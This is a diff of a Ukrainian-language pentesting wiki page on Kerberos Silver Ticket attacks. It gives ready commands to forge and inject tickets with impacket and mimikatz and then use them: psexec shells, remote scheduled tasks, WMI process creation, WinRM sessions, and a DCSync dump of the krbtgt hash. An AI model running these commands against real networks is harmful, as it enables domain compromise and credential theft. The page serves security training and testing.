@@ -1,4 +1,4 @@
-# Срібний квиток
+# Silver Ticket
 
 <details>
 
@@ -27,12 +27,15 @@
 Для створення квитків використовуються різні інструменти в залежності від операційної системи:
 
 ### На Linux
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### На Windows
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,20 +47,21 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 Служба CIFS відзначається як загальна мета для доступу до файлової системи жертви, але інші служби, такі як HOST та RPCSS, також можуть бути використані для завдань та запитів WMI.
 
 ## Доступні служби
 
-| Тип служби                                | Квитки Silver для служб                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Залежно від ОС також:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>У деяких випадках можна просто запросити: WINRM</p> |
-| Заплановані завдання                       | HOST                                                                       |
-| Спільний доступ до файлів Windows, також psexec | CIFS                                                                       |
-| Операції LDAP, включаючи DCSync            | LDAP                                                                       |
-| Засоби віддаленого керування сервером Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Золоті квитки                             | krbtgt                                                                     |
+| Тип служби                                      | Квитки Silver для служб                                                      |
+| ----------------------------------------------- | ---------------------------------------------------------------------------- |
+| WMI                                             | <p>HOST</p><p>RPCSS</p>                                                      |
+| PowerShell Remoting                             | <p>HOST</p><p>HTTP</p><p>Залежно від ОС також:</p><p>WSMAN</p><p>RPCSS</p>   |
+| WinRM                                           | <p>HOST</p><p>HTTP</p><p>У деяких випадках можна просто запросити: WINRM</p> |
+| Заплановані завдання                            | HOST                                                                         |
+| Спільний доступ до файлів Windows, також psexec | CIFS                                                                         |
+| Операції LDAP, включаючи DCSync                 | LDAP                                                                         |
+| Засоби віддаленого керування сервером Windows   | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                           |
+| Золоті квитки                                   | krbtgt                                                                       |
 
 За допомогою **Rubeus** ви можете **запитати всі** ці квитки, використовуючи параметр:
 
@@ -76,20 +80,23 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 ### CIFS
 
 З цим квитком ви зможете отримати доступ до папок `C$` та `ADMIN$` через **SMB** (якщо вони відкриті) та скопіювати файли на частину віддаленої файлової системи, просто виконавши:
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 Ви також зможете отримати оболонку всередині хоста або виконати довільні команди, використовуючи **psexec**:
 
-{% content-ref url="../ntlm/psexec-and-winexec.md" %}
-[psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
+{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
+[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
 {% endcontent-ref %}
 
 ### ХОСТ
 
 З цим дозволом ви можете генерувати заплановані завдання на віддалених комп'ютерах та виконувати довільні команди:
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -101,9 +108,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### HOST + RPCSS
 
 З цими квитками ви можете **виконати WMI в системі жертви**:
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -113,22 +122,25 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 Знайдіть **більше інформації про wmiexec** на наступній сторінці:
 
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
 {% endcontent-ref %}
 
 ### HOST + WSMAN (WINRM)
 
 З доступом до winrm на комп'ютері ви можете **отримати доступ до нього** та навіть виконати PowerShell:
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 Перевірте наступну сторінку, щоб дізнатися **більше способів підключення до віддаленого хоста за допомогою winrm**:
 
-{% content-ref url="../ntlm/winrm.md" %}
-[winrm.md](../ntlm/winrm.md)
+{% content-ref url="../lateral-movement/winrm.md" %}
+[winrm.md](../lateral-movement/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
@@ -138,9 +150,11 @@ New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ### LDAP
 
 З цими привілеями ви можете витягти базу даних DC, використовуючи **DCSync**:
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **Дізнайтеся більше про DCSync** на наступній сторінці:
 
 ## References
